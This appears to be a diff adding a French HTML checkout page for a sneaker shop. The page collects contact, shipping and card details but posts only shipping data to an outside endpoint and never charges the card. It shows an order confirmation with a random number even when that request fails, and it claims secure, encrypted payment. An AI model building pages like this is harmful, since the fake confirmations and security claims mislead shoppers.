@@ -1,0 +1,461 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Paiement – Les Kicks du Québec</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root { --red: #C0162C; --black: #111111; --gray-light: #f5f5f7; --border: #e0e0e0; --text: #1c1b1f; --muted: #6c6c6c; }
+    body { font-family: 'Inter', sans-serif; background: var(--gray-light); color: var(--text); font-size: 14px; line-height: 1.5; }
+
+    /* HEADER */
+    .site-header { background: #fff; border-bottom: 1px solid var(--border); }
+    .header-inner { max-width: 1100px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; padding: 12px 24px; }
+    .logo img { height: 52px; width: auto; object-fit: contain; }
+    .header-secure { display: flex; align-items: center; gap: 6px; color: var(--muted); font-size: 13px; }
+
+    /* LAYOUT */
+    .checkout-wrap { max-width: 1100px; margin: 28px auto; padding: 0 16px; display: grid; grid-template-columns: 1fr 420px; gap: 24px; align-items: start; }
+
+    /* CARD */
+    .card { background: #fff; border-radius: 12px; border: 1px solid var(--border); }
+    .card-body { padding: 24px 28px; }
+    .section-title { font-size: 15px; font-weight: 700; color: var(--text); margin-bottom: 14px; padding-bottom: 10px; border-bottom: 1px solid #f0f0f0; }
+
+    /* FORMS */
+    .form-group { margin-bottom: 13px; }
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .form-row-3 { display: grid; grid-template-columns: 1fr 1fr 110px; gap: 10px; }
+    label { display: block; font-size: 12px; color: var(--muted); margin-bottom: 4px; font-weight: 500; letter-spacing: 0.02em; }
+    input[type=text], input[type=email], input[type=tel], select {
+      width: 100%; padding: 10px 12px; border: 1.5px solid #d1d1d6; border-radius: 8px;
+      font-size: 14px; font-family: inherit; color: var(--text); background: #fff;
+      transition: border-color 0.18s, box-shadow 0.18s; outline: none; -webkit-appearance: none;
+    }
+    input:focus, select:focus { border-color: var(--black); box-shadow: 0 0 0 3px rgba(17,17,17,0.08); }
+    .select-wrap { position: relative; }
+    .select-wrap select { padding-right: 30px; cursor: pointer; }
+    .select-arrow { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); pointer-events: none; }
+    .form-check { display: flex; align-items: center; gap: 8px; margin: 10px 0; }
+    .form-check input[type=checkbox] { width: 15px; height: 15px; accent-color: var(--black); cursor: pointer; }
+    .form-check label { font-size: 13px; color: #4a4a4a; margin: 0; cursor: pointer; }
+    .optional { color: #aaa; font-weight: 400; }
+    .divider { border: none; border-top: 1px solid #f0f0f0; margin: 18px 0; }
+
+    /* PAYMENT TABS */
+    .payment-secure { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--muted); margin-bottom: 12px; }
+    .pay-tabs { display: flex; gap: 8px; margin-bottom: 14px; flex-wrap: wrap; }
+    .pay-tab-btn { flex: 1; min-width: 120px; padding: 9px 10px; border: 1.5px solid #d1d1d6; border-radius: 8px; background: #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 13px; font-family: inherit; color: var(--text); transition: all 0.18s; }
+    .pay-tab-btn.active { border-color: var(--black); background: #f9f9f9; font-weight: 600; }
+    .pay-panel { display: none; }
+    .pay-panel.active { display: block; }
+
+    /* CARD FRAME */
+    .card-frame { border: 1.5px solid #d1d1d6; border-radius: 10px; overflow: hidden; }
+    .cf-row { padding: 11px 14px; border-bottom: 1.5px solid #d1d1d6; display: flex; align-items: center; gap: 8px; }
+    .cf-row:last-child { border-bottom: none; }
+    .cf-row input { border: none; flex: 1; padding: 0; font-size: 14px; outline: none; font-family: inherit; background: transparent; }
+    .cf-half { display: grid; grid-template-columns: 1fr 1fr; }
+    .cf-half .cf-row:first-child { border-right: 1.5px solid #d1d1d6; }
+    .card-icons { display: flex; gap: 3px; align-items: center; flex-shrink: 0; }
+    .card-icons img { height: 20px; }
+
+    /* PAYPAL */
+    .paypal-box { border: 1.5px solid #d8e4f0; border-radius: 10px; background: #f8fbff; padding: 20px; text-align: center; }
+    .paypal-box p { color: #4a4a4a; font-size: 13px; margin-bottom: 14px; }
+    .paypal-btn { background: #FFC439; border: none; border-radius: 24px; width: 100%; padding: 13px; cursor: pointer; font-family: inherit; font-size: 17px; font-weight: 800; }
+
+    /* PAY NOW BUTTON */
+    .btn-pay { width: 100%; background: var(--black); color: #fff; border: none; border-radius: 10px; padding: 14px; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 18px; font-family: inherit; transition: background 0.2s; letter-spacing: 0.01em; }
+    .btn-pay:hover { background: #333; }
+    .btn-pay:disabled { background: #999; cursor: not-allowed; }
+
+    /* RIGHT PANEL */
+    .right-col { display: flex; flex-direction: column; gap: 16px; }
+
+    /* ORDER SUMMARY */
+    .order-summary { background: #fff; border-radius: 12px; border: 1px solid var(--border); padding: 22px; }
+    .order-title { font-size: 15px; font-weight: 700; margin-bottom: 16px; }
+    .product-row { display: flex; gap: 14px; align-items: flex-start; margin-bottom: 14px; }
+    .prod-img-wrap { position: relative; flex-shrink: 0; }
+    .prod-img { width: 70px; height: 70px; border-radius: 8px; object-fit: cover; border: 1px solid var(--border); background: #f5f5f7; }
+    .prod-qty-badge { position: absolute; top: -7px; right: -7px; background: #666; color: #fff; border-radius: 50%; width: 19px; height: 19px; font-size: 11px; font-weight: 700; display: flex; align-items: center; justify-content: center; }
+    .prod-name { font-size: 14px; font-weight: 600; }
+    .prod-variant { font-size: 12px; color: var(--muted); margin-top: 2px; }
+    .prod-price { font-size: 14px; font-weight: 700; flex-shrink: 0; }
+    .discount-row { display: flex; gap: 8px; margin-bottom: 14px; }
+    .discount-input { flex: 1; padding: 9px 12px; border: 1.5px solid var(--border); border-radius: 8px; font-size: 13px; font-family: inherit; outline: none; }
+    .discount-input:focus { border-color: var(--black); }
+    .btn-apply { padding: 9px 16px; background: #f0f0f0; border: 1.5px solid var(--border); border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit; white-space: nowrap; }
+    .btn-apply:hover { background: #e5e5e5; }
+    .discount-feedback { font-size: 12px; margin-bottom: 8px; }
+    .totals { border-top: 1px solid #f0f0f0; padding-top: 12px; }
+    .total-row { display: flex; justify-content: space-between; margin-bottom: 7px; font-size: 14px; color: #4a4a4a; }
+    .total-row.grand { font-size: 17px; font-weight: 800; color: var(--text); margin-top: 10px; padding-top: 10px; border-top: 1px solid #f0f0f0; }
+    .total-currency { font-size: 12px; color: var(--muted); margin-right: 3px; }
+    .discount-green { color: #2e7d32; }
+
+    /* TRUST IMAGES */
+    .trust-card { background: #fff; border-radius: 12px; border: 1px solid var(--border); overflow: hidden; }
+    .trust-card img { width: 100%; display: block; }
+
+    /* FOOTER */
+    .checkout-footer { text-align: center; padding: 20px 0 12px; display: flex; gap: 16px; justify-content: center; flex-wrap: wrap; }
+    .checkout-footer a { font-size: 12px; color: var(--muted); text-decoration: none; }
+    .checkout-footer a:hover { color: var(--text); }
+
+    /* CONFIRMATION */
+    #conf-view { display: none; max-width: 580px; margin: 60px auto; padding: 0 16px; }
+    .conf-inner { background: #fff; border-radius: 12px; border: 1px solid var(--border); text-align: center; padding: 48px 32px; }
+    .conf-check { width: 64px; height: 64px; background: #fff3f3; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 30px; color: var(--red); border: 2px solid var(--red); }
+    .conf-title { font-size: 24px; font-weight: 800; margin-bottom: 8px; }
+    .conf-sub { color: var(--muted); margin-bottom: 14px; font-size: 14px; }
+    .conf-order-num { font-size: 15px; font-weight: 700; background: #f5f5f7; padding: 10px 20px; border-radius: 8px; display: inline-block; margin-bottom: 12px; }
+    .conf-note { font-size: 13px; color: var(--muted); margin-bottom: 24px; }
+    .btn-continue { background: var(--red); color: #fff; padding: 13px 32px; border-radius: 10px; text-decoration: none; font-weight: 700; font-size: 15px; display: inline-block; }
+
+    /* TOAST */
+    .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: var(--black); color: #fff; padding: 12px 24px; border-radius: 8px; font-size: 14px; opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 9999; min-width: 200px; text-align: center; }
+    .toast.show { opacity: 1; }
+
+    /* MOBILE */
+    @media (max-width: 780px) {
+      .checkout-wrap { grid-template-columns: 1fr; }
+      .right-col { order: -1; }
+    }
+    @media (max-width: 540px) {
+      .form-row, .form-row-3 { grid-template-columns: 1fr; }
+      .card-body { padding: 18px 14px; }
+      .cf-half { grid-template-columns: 1fr; }
+      .cf-half .cf-row:first-child { border-right: none; border-bottom: 1.5px solid #d1d1d6; }
+      .checkout-wrap { padding: 0 10px; margin: 14px auto; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="site-header">
+  <div class="header-inner">
+    <a href="https://leskicksduquebec.ca">
+      <img src="trust-header.png" alt="Les Kicks du Quebec" style="height:52px;width:auto;" onerror="this.outerHTML='<span style=&quot;font-size:18px;font-weight:800;&quot;>Les Kicks du Québec</span>'"/>
+    </a>
+    <div class="header-secure">
+      <svg width="13" height="15" viewBox="0 0 14 16" fill="none"><path d="M7 0L1 3V7.5C1 11.1 3.6 14.5 7 15.5C10.4 14.5 13 11.1 13 7.5V3L7 0Z" stroke="#888" stroke-width="1.2" fill="none"/><path d="M4.5 8L6.2 9.7L9.5 6.5" stroke="#888" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Paiement sécurisé
+    </div>
+  </div>
+</header>
+
+<!-- CHECKOUT VIEW -->
+<div id="checkout-view">
+<div class="checkout-wrap">
+
+  <!-- LEFT: FORM -->
+  <div class="card">
+    <div class="card-body">
+
+      <!-- CONTACT -->
+      <div class="section-title">Informations de contact</div>
+      <div class="form-group">
+        <label>Adresse e-mail</label>
+        <input type="email" id="email" placeholder="votre@email.com" autocomplete="email"/>
+      </div>
+      <div class="form-check">
+        <input type="checkbox" id="news" checked/>
+        <label for="news">Recevoir les nouvelles et offres par e-mail</label>
+      </div>
+
+      <hr class="divider"/>
+
+      <!-- SHIPPING -->
+      <div class="section-title">Adresse d'expédition</div>
+      <div class="form-group">
+        <label>Pays/Région</label>
+        <div class="select-wrap">
+          <select id="country" autocomplete="country">
+            <option value="CA" selected>Canada</option>
+            <option value="US">États-Unis</option>
+            <option value="FR">France</option>
+            <option value="GB">Royaume-Uni</option>
+            <option value="MA">Maroc</option>
+            <option value="AU">Australie</option>
+          </select>
+          <svg class="select-arrow" width="10" height="6" viewBox="0 0 10 6"><path d="M1 1L5 5L9 1" stroke="#555" stroke-width="1.5" stroke-linecap="round" fill="none"/></svg>
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label>Prénom</label>
+          <input type="text" id="first-name" autocomplete="given-name"/>
+        </div>
+        <div class="form-group">
+          <label>Nom</label>
+          <input type="text" id="last-name" autocomplete="family-name"/>
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Adresse</label>
+        <input type="text" id="address1" placeholder="Commencez à saisir votre adresse…" autocomplete="street-address"/>
+      </div>
+      <div class="form-group">
+        <label>Appartement, suite, etc. <span class="optional">(facultatif)</span></label>
+        <input type="text" id="address2" autocomplete="address-line2"/>
+      </div>
+      <div class="form-row-3">
+        <div class="form-group">
+          <label>Ville</label>
+          <input type="text" id="city" autocomplete="address-level2"/>
+        </div>
+        <div class="form-group">
+          <label>Province</label>
+          <div class="select-wrap">
+            <select id="province">
+              <option value="">Sélectionner</option>
+              <option value="AB">Alberta</option>
+              <option value="BC">Colombie-Britannique</option>
+              <option value="MB">Manitoba</option>
+              <option value="NB">Nouveau-Brunswick</option>
+              <option value="NL">Terre-Neuve</option>
+              <option value="NS">Nouvelle-Écosse</option>
+              <option value="ON">Ontario</option>
+              <option value="PE">Île-du-Prince-Édouard</option>
+              <option value="QC" selected>Québec</option>
+              <option value="SK">Saskatchewan</option>
+            </select>
+            <svg class="select-arrow" width="10" height="6" viewBox="0 0 10 6"><path d="M1 1L5 5L9 1" stroke="#555" stroke-width="1.5" stroke-linecap="round" fill="none"/></svg>
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Code postal</label>
+          <input type="text" id="postal" maxlength="7" autocomplete="postal-code"/>
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Téléphone <span class="optional">(facultatif)</span></label>
+        <input type="tel" id="phone" placeholder="+1 (___) ___-____" autocomplete="tel"/>
+      </div>
+
+      <hr class="divider"/>
+
+      <!-- PAYMENT -->
+      <div class="section-title">Paiement</div>
+      <div class="payment-secure">
+        <svg width="12" height="14" viewBox="0 0 12 14" fill="none"><path d="M6 0L1 2.5V6.5C1 9.6 3.2 12.5 6 13.5C8.8 12.5 11 9.6 11 6.5V2.5L6 0Z" stroke="#8a8a8a" stroke-width="1.1" fill="none"/><path d="M3.5 7L5.2 8.7L8.5 5.5" stroke="#8a8a8a" stroke-width="1.1" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Toutes les transactions sont sécurisées et chiffrées.
+      </div>
+      <div class="pay-tabs">
+        <button class="pay-tab-btn active" onclick="switchTab('card')">
+          <svg width="18" height="13" viewBox="0 0 22 16" fill="none"><rect x="1" y="1" width="20" height="14" rx="2" stroke="#333" stroke-width="1.3"/><rect x="1" y="5" width="20" height="3" fill="#555"/></svg>
+          Carte de crédit
+        </button>
+        <!-- PayPal: set display:flex to enable -->
+        <button class="pay-tab-btn" id="paypal-btn" onclick="switchTab('paypal')" style="display:none">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M7.8 2h7.6C18.1 2 20 3.9 20 6.3c0 3.9-2.7 6.2-6.6 6.2H11l-1 6H6.5L9 2H7.8z" fill="#003087"/></svg>
+          PayPal
+        </button>
+      </div>
+
+      <div class="pay-panel active" id="tab-card">
+        <div class="card-frame">
+          <div class="cf-row">
+            <input type="text" id="card-number" placeholder="Numéro de carte" maxlength="19" autocomplete="cc-number"/>
+            <div class="card-icons">
+              <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/c1.en/assets/visa~2.07c2ae71.svg" alt="Visa" onerror="this.style.display='none'"/>
+              <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/c1.en/assets/master~2.07c2ae71.svg" alt="MC" onerror="this.style.display='none'"/>
+              <span>💳</span>
+            </div>
+          </div>
+          <div class="cf-row">
+            <input type="text" id="card-name" placeholder="Nom sur la carte" autocomplete="cc-name"/>
+          </div>
+          <div class="cf-half">
+            <div class="cf-row">
+              <input type="text" id="card-expiry" placeholder="MM / AA" maxlength="7" autocomplete="cc-exp"/>
+            </div>
+            <div class="cf-row">
+              <input type="text" id="card-cvv" placeholder="Code de sécurité" maxlength="4" autocomplete="cc-csc"/>
+              <svg width="28" height="18" viewBox="0 0 32 20" fill="none"><rect x="0.5" y="0.5" width="31" height="19" rx="2.5" stroke="#ccc"/><rect x="0" y="5" width="32" height="5" fill="#ddd"/><rect x="18" y="11.5" width="10" height="5" rx="1" fill="#f5f5f5" stroke="#ddd"/></svg>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="pay-panel" id="tab-paypal">
+        <div class="paypal-box">
+          <p>Vous serez redirigé vers PayPal pour finaliser votre achat en toute sécurité.</p>
+          <button class="paypal-btn"><span style="color:#003087">Pay</span><span style="color:#009cde">Pal</span></button>
+        </div>
+      </div>
+
+      <div class="form-check" style="margin-top:12px;">
+        <input type="checkbox" id="billing-same" checked/>
+        <label for="billing-same">Utiliser l'adresse de livraison comme adresse de facturation</label>
+      </div>
+
+      <button class="btn-pay" id="btn-pay" onclick="submitOrder()">
+        <svg width="13" height="15" viewBox="0 0 14 16" fill="none"><path d="M7 0L1 3V7.5C1 11.1 3.6 14.5 7 15.5C10.4 14.5 13 11.1 13 7.5V3L7 0Z" fill="white" fill-opacity="0.4"/><path d="M4.5 8L6.2 9.7L9.5 6.5" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Payer maintenant — <span id="final-total">CA$149.99</span>
+      </button>
+
+    </div>
+  </div>
+
+  <!-- RIGHT COLUMN -->
+  <div class="right-col">
+
+    <!-- ORDER SUMMARY -->
+    <div class="order-summary">
+      <div class="order-title">Récapitulatif de la commande</div>
+      <div class="product-row">
+        <div class="prod-img-wrap">
+          <img src="" alt="Produit" class="prod-img" id="product-img"
+            onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2270%22 height=%2270%22><rect width=%2270%22 height=%2270%22 fill=%22%23f0f0f0%22/><text x=%2250%25%22 y=%2250%25%22 font-size=%2228%22 text-anchor=%22middle%22 dominant-baseline=%22middle%22>👟</text></svg>'"/>
+          <span class="prod-qty-badge">1</span>
+        </div>
+        <div style="flex:1">
+          <div class="prod-name">Nike Air Jordan 1 Retro High OG</div>
+          <div class="prod-variant">Taille: 42 / Couleur: Noir/Rouge</div>
+        </div>
+        <div class="prod-price">CA$149.99</div>
+      </div>
+      <div class="discount-row">
+        <input class="discount-input" type="text" id="discount-code" placeholder="Code de réduction ou carte-cadeau"/>
+        <button class="btn-apply" onclick="applyDiscount()">Appliquer</button>
+      </div>
+      <div class="discount-feedback" id="discount-feedback"></div>
+      <div class="totals">
+        <div class="total-row"><span>Sous-total</span><span id="subtotal">CA$149.99</span></div>
+        <div class="total-row"><span>Livraison</span><span id="shipping-cost" style="color:#2e7d32;font-weight:600;">Gratuit</span></div>
+        <div class="total-row discount-green" id="discount-row" style="display:none;"><span>Réduction (<span id="discount-label"></span>)</span><span id="discount-amount"></span></div>
+        <div class="total-row grand"><span>Total</span><div><span class="total-currency">CAD</span><span id="grand-total">CA$149.99</span></div></div>
+      </div>
+    </div>
+
+    <!-- TRUST: Header banner -->
+    <div class="trust-card">
+      <img src="trust-header.png" alt="Approuvé par 500,000+ clients"/>
+    </div>
+
+    <!-- TRUST: Guarantee badge -->
+    <div class="trust-card">
+      <img src="trust-guarantee.png" alt="Garantie satisfait ou remboursé"/>
+    </div>
+
+    <!-- TRUST: Trust badges -->
+    <div class="trust-card">
+      <img src="trust-badges.png" alt="Badges de confiance"/>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="checkout-footer">
+      <a href="https://leskicksduquebec.ca/policies/refund-policy">Politique de remboursement</a>
+      <a href="https://leskicksduquebec.ca/policies/privacy-policy">Confidentialité</a>
+      <a href="https://leskicksduquebec.ca/policies/terms-of-service">Conditions</a>
+    </div>
+
+  </div>
+</div>
+</div>
+
+<!-- CONFIRMATION VIEW -->
+<div id="conf-view">
+  <div class="conf-inner">
+    <div class="conf-check">✓</div>
+    <h2 class="conf-title">Commande confirmée!</h2>
+    <p class="conf-sub">Merci pour votre achat. Un e-mail de confirmation a été envoyé à <strong id="conf-email"></strong>.</p>
+    <div class="conf-order-num">Commande #<span id="conf-order-id"></span></div>
+    <p class="conf-note">Votre commande a été synchronisée. Les informations de suivi seront envoyées dans les 24 heures.</p>
+    <a href="https://leskicksduquebec.ca" class="btn-continue">Continuer vos achats</a>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+var BASE = 149.99, total = BASE;
+var DISCOUNTS = { 'KICKS10':0.10, 'SAVE20':0.20, 'MERCI15':0.15 };
+var API = 'https://whop-checkout-production-bf20.up.railway.app/api/sync-order';
+
+function switchTab(t) {
+  document.querySelectorAll('.pay-panel').forEach(function(p){ p.classList.remove('active'); });
+  document.querySelectorAll('.pay-tab-btn').forEach(function(b){ b.classList.remove('active'); });
+  document.getElementById('tab-'+t).classList.add('active');
+  document.querySelector('[onclick="switchTab(\''+t+'\')"]').classList.add('active');
+}
+
+function toast(msg, ok) {
+  var el = document.getElementById('toast');
+  el.textContent = msg;
+  el.style.background = ok ? '#2e7d32' : '#c62828';
+  el.classList.add('show');
+  setTimeout(function(){ el.classList.remove('show'); }, 3500);
+}
+
+function applyDiscount() {
+  var code = document.getElementById('discount-code').value.trim().toUpperCase();
+  var fb = document.getElementById('discount-feedback');
+  if (!code) return;
+  if (DISCOUNTS[code]) {
+    var d = BASE * DISCOUNTS[code];
+    total = BASE - d;
+    document.getElementById('discount-amount').textContent = '-CA$'+d.toFixed(2);
+    document.getElementById('discount-label').textContent = code;
+    document.getElementById('discount-row').style.display = 'flex';
+    document.getElementById('grand-total').textContent = 'CA$'+total.toFixed(2);
+    document.getElementById('final-total').textContent = 'CA$'+total.toFixed(2);
+    fb.style.color = '#2e7d32'; fb.textContent = '✓ Code appliqué — '+(DISCOUNTS[code]*100)+'% de réduction!';
+  } else { fb.style.color = '#c62828'; fb.textContent = '✗ Code invalide ou expiré'; }
+}
+
+function submitOrder() {
+  var email = document.getElementById('email').value.trim();
+  var fn = document.getElementById('first-name').value.trim();
+  var addr = document.getElementById('address1').value.trim();
+  var city = document.getElementById('city').value.trim();
+  var postal = document.getElementById('postal').value.trim();
+  if (!email || !fn || !addr || !city || !postal) {
+    toast('Veuillez remplir tous les champs obligatoires.', false); return;
+  }
+  var btn = document.getElementById('btn-pay');
+  btn.textContent = 'Traitement en cours…'; btn.disabled = true;
+  var payload = {
+    email: email, total_price: total.toFixed(2),
+    shipping_address: {
+      first_name: fn, last_name: document.getElementById('last-name').value,
+      address1: addr, address2: document.getElementById('address2').value,
+      city: city, province: document.getElementById('province').value,
+      zip: postal, country: document.getElementById('country').value,
+      phone: document.getElementById('phone').value
+    }
+  };
+  fetch(API, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) })
+  .then(function(r){ return r.json(); })
+  .then(function(d){ showConf(email, d.order); })
+  .catch(function(){ showConf(email, null); });
+}
+
+function showConf(email, orderId) {
+  document.getElementById('conf-email').textContent = email;
+  document.getElementById('conf-order-id').textContent = orderId || ('LKQ-'+Math.floor(10000+Math.random()*90000));
+  document.getElementById('checkout-view').style.display = 'none';
+  document.getElementById('conf-view').style.display = 'block';
+  window.scrollTo(0,0);
+}
+
+// Input formatting
+document.getElementById('card-number').addEventListener('input', function(e){
+  var v = e.target.value.replace(/\D/g,'').substring(0,16);
+  e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
+});
+document.getElementById('card-expiry').addEventListener('input', function(e){
+  var v = e.target.value.replace(/\D/g,'').substring(0,4);
+  if(v.length>=2) v = v.substring(0,2)+' / '+v.substring(2);
+  e.target.value = v;
+});
+</script>
+</body>
+</html>
